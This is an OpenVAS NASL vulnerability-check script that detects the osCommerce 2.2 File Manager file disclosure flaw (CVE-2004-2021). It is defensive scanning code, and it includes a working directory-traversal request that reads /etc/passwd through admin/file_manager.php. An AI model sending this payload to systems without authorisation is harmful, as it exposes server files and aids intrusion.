# OpenVAS Vulnerability Test
# $Id: oscommerce_file_manager_disclosure.nasl 3501 2016-06-13 15:57:18Z mime $
# Description: File Disclosure in osCommerce's File Manager
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "There is a vulnerability in the osCommerce's File Manager
that allows an attacker to retrieve arbitrary files
from the webserver that reside outside the bounding HTML root
directory.";

# From: Rene <l0om@excluded.org>
# Subject: oscommerce 2.2 file_manager.php file browsing
# Date: 17.5.2004 22:37

if(description)
{
  script_id(12242);
  script_version("$Revision: 3501 $");
  script_tag(name:"last_modification", value:"$Date: 2016-06-13 17:57:18 +0200 (Mon, 13 Jun 2016) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2004-2021");
  script_bugtraq_id(10364);
  script_xref(name:"OSVDB", value:"6308");

  name = "File Disclosure in osCommerce's File Manager";
  script_name(name);
 

 
  summary = "Detect osCommerce's File Manager File Disclosure";
  script_summary(summary);
 
  script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 
  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");

  family = "General";
  script_family(family);
  script_dependencies("oscommerce_detect.nasl");
  script_require_keys("Software/osCommerce");
  script_require_ports("Services/www", 80);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

CPE = 'cpe:/a:oscommerce:oscommerce';

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

function check_dir(path)
{
	req = http_get(item:string(path, 
		"/admin/file_manager.php?action=download&filename=../../../../../../../../etc/passwd"), 
		port:port);
 	res = http_keepalive_send_recv(port:port, data:req);
	if ( res == NULL ) exit(0);
 	if(egrep(pattern:".*root:.*:0:[01]:.*", string:res))
 	{
          report = report_vuln_url( port:port, url:url );
  	  security_message(port:port, data:report);
  	  exit(0);
 	}

}

check_dir(path:dir);

